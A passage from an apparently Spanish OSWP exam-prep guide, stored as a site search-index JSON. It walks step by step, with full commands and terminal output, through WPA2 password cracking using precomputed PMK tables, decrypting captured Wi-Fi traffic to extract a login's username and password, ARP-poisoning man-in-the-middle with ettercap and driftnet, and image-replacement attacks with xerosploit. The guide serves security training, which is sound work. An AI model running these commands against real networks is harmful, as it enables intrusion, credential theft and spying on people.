in buffer)\nComputed 15000 PMK in 36 seconds (416 PMK/s, 9078 in buffer)\nComputed 20000 PMK in 48 seconds (416 PMK/s, 4078 in buffer)\nComputed 24078 PMK in 58 seconds (415 PMK/s, 0 in buffer)\nAll ESSID processed.\n</code></pre> <p>Una vez generado, atentos a la velocidad. Vamos a ver con aircrack cu\u00e1nto tardamos haciendo uso del procedimiento tradicional:</p> <pre><code>                             Aircrack-ng 1.5.2 \n\n      [00:00:02] 22832/24078 keys tested (9415.01 k/s) \n\n      Time left: 0 seconds                                      94.83%\n\n                           KEY FOUND! [ hottie4u ]\n\n\n      Master Key     : B1 42 12 E4 D4 86 FF 87 49 04 29 E3 51 E3 C6 BC \n                       C0 EA A3 03 A6 ED E3 79 A0 A4 BC D6 8F 3B 39 E3 \n\n      Transient Key  : F7 17 BB BB 6F A3 9A E8 D5 DA E6 3E 0E C5 0B 45 \n                       C8 D6 47 4B 87 12 FF A7 80 6A 44 00 05 77 CC 96 \n                       35 99 2D BA 9D B0 A4 CF C2 43 CF 66 2B 74 D9 16 \n                       7C ED 59 EF AE 70 5D 23 D9 7B 9E B9 38 2A 87 CC \n\n      EAPOL HMAC     : 7F A8 E0 CC 77 49 2C E9 51 8C 81 42 F9 DB CE E0\n</code></pre> <p>Valores clave:</p> <ul> <li>9.415 contrase\u00f1as por segundo</li> <li>2 segundos hasta dar con la contrase\u00f1a</li> </ul> <p>Ahora bien, hagamos uso de aircrack para crackear nuevamente la contrase\u00f1a, pero esta vez con una sintaxis que toma como input el fichero creado con airolib:</p> <ul> <li>aircrack-ng -r passwords-airolib Captura-01.cap</li> </ul> <p>Obtenemos los siguientes resultados:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #aircrack-ng -r passwordsAircrack-ng 1.5.2 1.cap\n\n      [00:00:00] 15241/0 keys tested (204456.39 k/s) \n\n      Time left: \n\n                           KEY FOUND! [ hottie4u ]\n\n\n      Master Key     : 24 87 02 AB 54 4E 47 C1 C0 DC DE E9 DF 7D 22 88 \n                       80 C4 F0 07 F9 04 B8 71 B7 72 2A F1 04 75 57 99 \n\n      Transient Key  : 21 6C FB DC 6B D0 98 59 99 F1 A3 1A B2 CF 9D 67 \n                       E2 6C DA 3C CC 50 B2 60 9B 65 D3 B1 94 DA B4 AB \n                       92 62 DB 80 C5 CB DA 15 A5 04 D3 C7 5B A2 FD 8F \n                       87 36 0A 3A 99 45 14 A2 61 8D 3B 90 44 53 6A A4 \n\n      EAPOL HMAC     : 64 A2 4A 1B D6 22 93 78 78 09 2F 42 7E 11 8F BC \n</code></pre> <p>Valores clave:</p> <ul> <li>204.456 contrase\u00f1as por segundo</li> <li>0.X segundos hasta dar con la contrase\u00f1a</li> </ul> <p>Lo s\u00e9, flipante, pero es que se puede ir a\u00fan m\u00e1s r\u00e1pido.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#rainbow-table-con-genpmk","title":"Rainbow Table con Genpmk","text":"<p>Hemos visto c\u00f3mo podemos aumentar considerablemente la velocidad de c\u00f3mputo haciendo uso de la suite de aircrack. Ahora distanci\u00e9monos un poco de aircrack y pensemos en Cowpatty y Pyrit, no nos sorprendi\u00f3 mucho la \u00faltima vez, \u00bfverdad?, sin embargo, vamos a hacer que tomen un papel m\u00e1s importante.</p> <p>El fichero passwords-airolib no puede ser aprovechado por Cowpatty ni por Pyrit, en este caso tendremos que hacer uso de genpmk para generar un nuevo diccionario de claves precomputadas adaptado para que sea interpretado por estas fant\u00e1sticas herramientas.</p> <p>La sintaxis es la siguiente:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #genpmk -f diccionario -d dic.genpmk -s hacklab\ngenpmk 1.3 - WPA-PSK precomputation attack. &lt;jwright@hasborg.com&gt;\nFile dic.genpmk does not exist, creating.\nkey no. 1000: skittles1\nkey no. 2000: princess15\nkey no. 3000: unfaithful\nkey no. 4000: andresteamo\nkey no. 5000: hennessy\nkey no. 6000: amigasporsiempre\nkey no. 7000: 0123654789\nkey no. 8000: trinitron\nkey no. 9000: flower22\nkey no. 10000: vincenzo\nkey no. 11000: pensacola\nkey no. 12000: boyracer\nkey no. 13000: grandmom\nkey no. 14000: battlefield\nkey no. 15000: badangel\nkey no. 16000: liferocks\nkey no. 17000: forever15\nkey no. 18000: gabriell\nkey no. 19000: mexico18\nkey no. 20000: 13031991\nkey no. 21000: kitty1234\nkey no. 22000: casper22\nkey no. 23000: 12021989\nkey no. 24000: tigers15\n\n24078 passphrases tested in 39.35 seconds:  611.90 passphrases/second\n</code></pre> <p>Esto lo que ha hecho ha sido generarnos un nuevo diccionario dic.genpmk de claves precomputadas. Llegados a este punto, podemos hacer lo que se describe en los siguientes puntos.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#cracking-con-cowpatty-frente-a-rainbow-table","title":"Cracking con Cowpatty frente a Rainbow Table","text":"<p>Aprovechando el diccionario dic.genpmk generado con genpmk, hacemos lo siguiente:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #cowpatty -d dic.genpmk -r Captura-01.cap -s hacklab\ncowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;\n\nCollected all necessary data to mount crack against WPA2/PSK passphrase.\nStarting dictionary attack.  Please be patient.\nkey no. 10000: vincenzo\n\nThe PSK is \"hottie4u\".\n\n15242 passphrases tested in 0.04 seconds:  361013.75 passphrases/second\n</code></pre> <p>Puntos clave:</p> <ul> <li>361.013 contrase\u00f1as por segundo</li> <li>0.04 segundos en dar la contrase\u00f1a</li> </ul> <p>\u00bfIntentamos ir algo m\u00e1s r\u00e1pido?</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#cracking-con-pyrit-frente-a-rainbow-table","title":"Cracking con Pyrit frente a Rainbow Table","text":"<p>Aprovechando una vez m\u00e1s el mismo diccionario dic.genpmk generado con genpmk, hacemos lo siguiente:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -i dic.genpmk -e hacklab -r Captura-01.cap attack_cowpatty\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nParsing file 'Captura-01.cap' (1/1)...\nParsed 43 packets (43 802.11-packets), got 1 AP(s)\n\nPicked AccessPoint 20:34:fb:b1:c5:53 automatically...\nTried 24078 PMKs so far; 1992708 PMKs per second.\n\nThe password is 'hottie4u'.\n</code></pre> <p>Puntos clave:</p> <ul> <li>1.992.708 contrase\u00f1as por segundo</li> </ul> <p>Ya en este punto se podr\u00eda decir que trabajando a unas casi 2 millones de contrase\u00f1as por segundo, estar\u00edamos m\u00e1s que contentos, \u00bfverdad?, pero es que se puede ir a\u00fan m\u00e1s r\u00e1pido todav\u00eda.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#cracking-con-pyrit-a-traves-de-ataque-por-base-de-datos","title":"Cracking con Pyrit a trav\u00e9s de ataque por Base de Datos","text":"<p>Este es ya el considerado como el m\u00e9todo m\u00e1s potente. Comenzamos importando todas las contrase\u00f1as de nuestro diccionario desde Pyrit:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -i diccionario import_passwords\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nConnecting to storage at 'file://'...  connected.\n70000 lines read. Flushing buffers.... \nAll done.\n</code></pre> <p>Una vez hecho, especificamos el ESSID con el que vamos a trabajar:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -e hacklab create_essid\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nConnecting to storage at 'file://'...  connected.\nESSID already created\n</code></pre> <p>Por \u00faltimo, generamos las claves precomputadas:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit batch\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nConnecting to storage at 'file://'...  connected.\nBatchprocessing done.\n</code></pre> <p>Iniciamos el ataque en modo ataque de base de datos con Pyrit:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -r Captura-01.cap attack_db\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nConnecting to storage at 'file://'...  connected.\nParsing file 'Captura-01.cap' (1/1)...\nParsed 43 packets (43 802.11-packets), got 1 AP(s)\n\nPicked AccessPoint 20:34:fb:b1:c5:53 ('hacklab') automatically.\nAttacking handshake with Station 34:41:5d:46:d1:38...\nTried 37326 PMKs so far (100.0%); 18289321 PMKs per second.\n\nThe password is 'hottie4u'.\n</code></pre> <p>Y fijaros que velocidad m\u00e1s vertiginosa:</p> <ul> <li>18.289.321 contrase\u00f1as por segundo</li> </ul>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#tecnicas-de-espionaje","title":"T\u00e9cnicas de Espionaje","text":"<p>Este punto engloba algunas t\u00e9cnicas b\u00e1sicas sin entrar en fase de Pentesting para a nivel de red ser capaces de saber qu\u00e9 es lo que est\u00e1n haciendo nuestras v\u00edctimas, incluido el robo de datos para ciertos casos.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#uso-de-airdecap-para-el-desencriptado-de-paquetes","title":"Uso de Airdecap para el desencriptado de paquetes","text":"<p>Hasta ahora hemos visto c\u00f3mo obtener las credenciales de acceso a una red inal\u00e1mbrica. Ahora bien, \u00bfqu\u00e9 pasa una vez estamos dentro?</p> <p>Est\u00e1 claro que podr\u00edamos iniciar con una fase de Pentesting para tratar de vulnerar la seguridad de los sistemas y comenzar a comprometer todos los equipos, pero no es la idea. Partiremos a nivel de red, viendo hasta qu\u00e9 punto podemos llegar con la informaci\u00f3n que hemos recopilado.</p> <p>Si nos fijamos, las capturas de monitorizado activo que exportamos con \u2018airodump-ng\u2019 viajan encriptadas, es decir, no es posible visualizar consultas HTTP ni peticiones a nivel privado de red:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01.cap -Y \"http.request.method==POST\" 2&gt;/dev/null\n# Sin resultados\n</code></pre> <p>\u00bfPor qu\u00e9?, porque todo lo que estamos capturando es el tr\u00e1fico externo que recopilamos en modo monitor:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01.cap 2&gt;/dev/null | head -n 10 \n    1   0.000000 AskeyCom_d4:16:78 \u2192 Broadcast    802.11 268 Beacon frame, SN=2233, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677\n    2   2.150527 AskeyCom_d4:16:78 \u2192 XiaomiCo_b1:c5:53 802.11 341 Probe Response, SN=2255, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677\n    3   2.150557              \u2192 AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 10 Acknowledgement, Flags=........\n    4   2.165375 AskeyCom_d4:16:78 \u2192 XiaomiCo_b1:c5:53 802.11 341 Probe Response, SN=2256, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677\n    5   2.165405              \u2192 AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 10 Acknowledgement, Flags=........\n    6   2.635968 XiaomiCo_b1:c5:53 \u2192 Broadcast    802.11 94 Data, SN=2262, FN=0, Flags=.p....F.\n    7   2.941632 XiaomiCo_b1:c5:53 \u2192 Broadcast    802.11 94 Data, SN=2266, FN=0, Flags=.p....F.\n    8   6.679016 IntelCor_46:d1:38 \u2192 AskeyCom_d4:16:77 802.11 110 QoS Data, SN=1512, FN=0, Flags=.p.....T\n    9   6.678975              \u2192 IntelCor_46:d1:38 (34:41:5d:46:d1:38) (RA) 802.11 10 Acknowledgement, Flags=........\n   10   6.681029 AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (TA) \u2192 IntelCor_46:d1:38 (34:41:5d:46:d1:38) (RA) 802.11 16 Request-to-send, Flags=........\n</code></pre> <p>No podemos ver desde aqu\u00ed ning\u00fan tipo de consulta HTTP o tr\u00e1fico interno. </p> <p>Entonces bien, \u00bfqu\u00e9 hacemos?, vamos a usar la cabeza por unos momentos. \u00bfQu\u00e9 es lo que hace que los paquetes que capturemos est\u00e9n encriptados y no podamos ver el tr\u00e1fico privado?, la propia contrase\u00f1a de la red, \u00bfno?, \u00bfy qu\u00e9 pasa si la tenemos?, \u00bfno se supone que deber\u00edamos ser capaces entonces de desencriptar estos paquetes?, correcto.</p> <p>A trav\u00e9s de la herramienta airdecap-ng de la suite de aircrack, es posible desencriptar estas capturas siempre y cuando se proporcione la contrase\u00f1a de la red correcta.</p> <p>Lo hacemos de la siguiente manera:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ls\nCaptura-01.cap\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #airdecap-ng -e MOVISTAR_1677 -p XXXXXXXXXXXXXXXXXXXX Captura-01.cap \nTotal number of stations seen            9\nTotal number of packets read          2838\nTotal number of WEP data packets         0\nTotal number of WPA data packets      1082\nNumber of plaintext data packets         0\nNumber of decrypted WEP  packets         0\nNumber of corrupted WEP  packets         0\nNumber of decrypted WPA  packets       189\nNumber of bad TKIP (WPA) packets         0\nNumber of bad CCMP (WPA) packets         0\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #\n</code></pre> <p>Si nos fijamos, se han desencriptado un total de 189 paquetes WPA. Esto es as\u00ed debido a que la contrase\u00f1a proporcionada es la correcta, si hubiera puesto una que no fuera correcta no se habr\u00eda desencriptado nada.</p> <p>Esto nos genera en el directorio actual de trabajo un nuevo fichero:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ls\nCaptura-01.cap  Captura-01-dec.cap\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #\n</code></pre> <p>Sobre el cual podremos hacer los filtrados para visualizar el tr\u00e1fico interno.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#analisis-del-desencriptado-con-tshark-y-wireshark","title":"An\u00e1lisis del desencriptado con Tshark y Wireshark","text":"<p>Realmente usar\u00e9 Tshark, pero desde Wireshark obtendr\u00edamos los mismos resultados. Intentemos ver ahora si somos capaces de visualizar tr\u00e1fico HTTP, concretamente, alguna petici\u00f3n POST que se haya realizado:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01-dec.cap -Y \"http.request.method==POST\" 2&gt;/dev/null\n  185  10.456181 192.168.1.55 \u2192 46.231.127.84 HTTP 736 POST /includes/posthandler.php HTTP/1.1  (application/x-www-form-urlencoded)\n</code></pre> <p>Interesante, vemos algo. Intentemos ver si somos capaces de visualizar el payload de esta petici\u00f3n:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01-dec.cap -Y \"http.request.method==POST\" -Tfields -e tcp.payload 2&gt;/dev/null\n50:4f:53:54:20:2f:69:6e:63:6c:75:64:65:73:2f:70:6f:73:74:68:61:6e:64:6c:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:30:35:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:58:2d:52:65:71:75:65:73:74:65:64:2d:57:69:74:68:3a:20:58:4d:4c:48:74:74:70:52:65:71:75:65:73:74:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:58:31:31:3b:20:4c:69:6e:75:78:20:78:38:36:5f:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:37:36:2e:30:2e:33:38:30:39:2e:38:37:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:3b:20:63:68:61:72:73:65:74:3d:55:54:46:2d:38:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:2f:6c:6f:67:69:6e:2e:70:68:70:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:65:73:2d:45:53:2c:65:73:3b:71:3d:30:2e:39:2c:65:6e:3b:71:3d:30:2e:38:2c:6a:61:3b:71:3d:30:2e:37:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:65:32:64:36:30:65:65:37:63:37:63:65:34:32:64:34:65:39:37:31:37:30:33:65:37:62:38:38:35:34:36:34:0d:0a:0d:0a:75:73:65:72:6e:61:6d:65:3d:73:34:76:69:74:61:72:26:70:61:73:73:77:6f:72:64:3d:6d:69:50:61:73:73:77:6f:72:64:49:6d:70:6f:73:69:62:6c:65:64:65:4f:62:74:65:6e:65:72:26:74:6f:6b:65:6e:3d:66:34:35:65:36:32:30:61:62:33:64:34:63:62:30:30:61:35:34:33:66:37:33:37:37:64:34:30:61:63:63:65:26:6c:6f:67:69:6e:3d:4c:6f:67:69:6e\n</code></pre> <p>\u00a1Perfecto!, est\u00e1 en hexadecimal, pas\u00e9moslo a un formato algo m\u00e1s legible y veamos si podemos sacar alg\u00fan dato en claro:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01-dec.cap -Y \"http.request.method==POST\" -Tfields -e tcp.payload 2&gt;/dev/null | xxd -ps -r; echo\nPOST /includes/posthandler.php HTTP/1.1\nHost: www.alcanzatumeta.es\nConnection: keep-alive\nContent-Length: 105\nAccept: */*\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nOrigin: http://www.alcanzatumeta.es\nReferer: http://www.alcanzatumeta.es/login.php\nAccept-Encoding: gzip, deflate\nAccept-Language: es-ES,es;q=0.9,en;q=0.8,ja;q=0.7\nCookie: PHPSESSID=e2d60ee7c7ce42d4e971703e7b885464\n\nusername=s4vitar&amp;password=miPasswordImposibledeObtener&amp;token=f45e620ab3d4cb00a543f7377d40acce&amp;login=Login\n</code></pre> <p>Estupendo, como vemos, usuario y contrase\u00f1a:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01-dec.cap -Y \"http.request.method==POST\" -Tfields -e tcp.payload 2&gt;/dev/null | xxd -ps -r | tail -n 1 | cut -d '&amp;' -f 1-2 | tr '&amp;' '\\n'\nusername=s4vitar\npassword=miPasswordImposibledeObtener\n</code></pre> <p>La elegancia de todo esto est\u00e1 en que no estamos haciendo un MITM tradicional estando asociados en la red, lo cual puede levantar sospechas dado que la mayor\u00eda de ataques de tipo ARP Spoofing/DNS Spoofing ya son detectados y alertados por la mayor\u00eda de navegadores.</p> <p>Este ataque lo estamos haciendo desde fuera de la red, sin estar asociados, capturando simplemente el tr\u00e1fico que percibamos estando en modo monitor, lo cual es fascinante.</p> <p>IMPORTANTE: Para desencriptar el tr\u00e1fico de un cliente, es necesario capturar un Handshake por parte de dicha estaci\u00f3n. En caso contrario, no ser\u00e1 posible desencriptar su tr\u00e1fico.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#espionaje-con-ettercap-driftnet-y-enrutamiento-con-iptables","title":"Espionaje con Ettercap Driftnet y enrutamiento con iptables","text":"<p>Considerando que ya estamos conectados a la red y queremos actuar de manera activa, no pasiva como se vio en el punto anterior, lo primero que debemos hacer es habilitar el enrutamiento en nuestro equipo:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #\n</code></pre> <p>Una vez hecho, generamos una peque\u00f1a regla en iptables para definir c\u00f3mo se debe de comportar el tr\u00e1fico a la hora de envenenar la red. Para este caso, queremos que todo el tr\u00e1fico dirigido al puerto 80 sea enrutado al puerto 8080:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #\n</code></pre> <p>Antes que nada recomiendo limpiar cualquier tipo de regla previa definida en iptables. Para al que le guste la idea, en mi caso tengo creado un alias a nivel de bashrc:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #cat ~/.bashrc | grep flushIPTABLES -A 5\nfunction flushIPTABLES(){\n    iptables --flush\n    iptables --table nat --flush\n    iptables --delete-chain\n    iptables --table nat --delete-chain\n}\n</code></pre> <p>As\u00ed cuando escribo flushIPTABLES se me limpian todas las reglas previamente definidas.</p> <p>Posteriormente, retocamos el fichero /etc/ettercap/etter.conf, cambiando los valores por defecto a 0:</p> <pre><code>[privs]\nec_uid = 0                # nobody is the default\nec_gid = 0                # nobody is the default\n</code></pre> <p>Por otro lado, descomentamos estas 2 l\u00edneas de dicho archivo:</p> <pre><code># if you use iptables:\n   redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\"\n   redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\"\n</code></pre> <p>Una vez hecho, abrimos Ettercap en modo gr\u00e1fico a trav\u00e9s del par\u00e1metro '-G'. Lo primero que haremos ser\u00e1 escanear los Hosts disponibles en la red:</p> <p></p> <p>Esto se puede hacer de manera intuitiva a trav\u00e9s de la pesta\u00f1a Hosts. Una vez hecho, y este paso es importante, lo que haremos ser\u00e1 seleccionar en primer lugar nuestro Gateway (192.168.1.1) y presionar en Add to Target 1, seguidamente seleccionamos la direcci\u00f3n IP de nuestra v\u00edctima y presionamos en Add To Target 2:</p> <p></p> <p>Ya con este esquema configurado, verificamos desde la pesta\u00f1a Targets que todo est\u00e9 como debe estar:</p> <p></p> <p>Si es as\u00ed, continuamos. Nos iremos a la pesta\u00f1a Mitm y pincharemos en ARP Poissoning. Acto seguido, se nos abrir\u00e1 una ventana, en ella seleccionamos la casilla Sniff Remote Connections y presionamos en Aceptar.</p> <p>Tras hacer esto, deber\u00edamos ver lo siguiente desde la ventana principal:</p> <p></p> <p>Ahora toca hacer la prueba de fuego. Cargamos los siguientes comandos desde consola:</p> <p></p> <p>Una vez estos est\u00e1n corriendo, simulamos la navegaci\u00f3n desde el dispositivo cuyo tr\u00e1fico se est\u00e1 envenenando.</p> <p>En este caso, se accede a una direcci\u00f3n URL de noticias, obteniendo los siguientes resultados:</p> <p></p> <p>Cabe decir que a su vez estamos usando driftnet, raz\u00f3n por la que adem\u00e1s de visualizar la direcci\u00f3n URL que se est\u00e1 visitando, somos capaces de ver las im\u00e1genes que cargan a tiempo real en dicha p\u00e1gina web. </p> <p>Si le damos un tiempo, conseguiremos extraer incluso m\u00e1s im\u00e1genes a\u00fan:</p> <p></p> <p>A su vez, podemos aprovechar el propio Ettercap para capturar credenciales de autenticaci\u00f3n a una p\u00e1gina web:</p> <p></p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#ataques-graciosos","title":"Ataques graciosos","text":"<p>Estos ataques forman parte de una categor\u00eda que considero algo Off-Topic, porque no obtenemos nada de inter\u00e9s con ello.. pero bueno, puede servir para echarnos unas risas de vez en cuando.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#reemplazado-de-imagenes-web","title":"Reemplazado de im\u00e1genes web","text":"<p>En este punto, lo que haremos ser\u00e1 envenenar el tr\u00e1fico de nuestra v\u00edctima una vez m\u00e1s pero esta vez para manipular las im\u00e1genes que se disponen en las p\u00e1ginas web a las que accede.</p> <p>Para ello, previamente necesitamos contar con una imagen, la cual utilizaremos para hacer la sustituci\u00f3n. Por otro lado, necesitamos tener instalada la herramienta Xerosploit en nuestro equipo.</p> <ul> <li>Repositorio: https://github.com/LionSec/xerosploit</li> </ul> <p>Una vez la tengamos instalada, ejecutamos xerosploit desde consola:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #xerosploit \n\n____  __                     ________         ______       _____ _____ \n__  |/ /_____ ______________ __  ___/________ ___  /______ ___(_)__  /_\n__    / _  _ \\__  ___/_  __ \\_____ \\ ___  __ \\__  / _  __ \\__  / _  __/\n_    |  /  __/_  /    / /_/ /____/ / __  /_/ /_  /  / /_/ /_  /  / /_  \n/_/|_|  \\___/ /_/     \\____/ /____/  _  .___/ /_/   \\____/ /_/   \\__/  \n                                     /_/                                    \n\n\n[+]\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550[ Author : @LionSec1 _-\\|/-_ Website: lionsec.net ]\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550[+]\n\n                      [ Powered by Bettercap and Nmap ]\n\n\u250c\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2510\n\u2588                                                                             \u2588\n\u2588                         Your Network Configuration                          \u2588 \n\u2588                                                                             \u2588\n\u2514\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2518     \n\n\u2552\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2555\n\u2502  IP Address  \u2502    MAC Address    \u2502   Gateway   \u2502  Iface  \u2502  Hostname  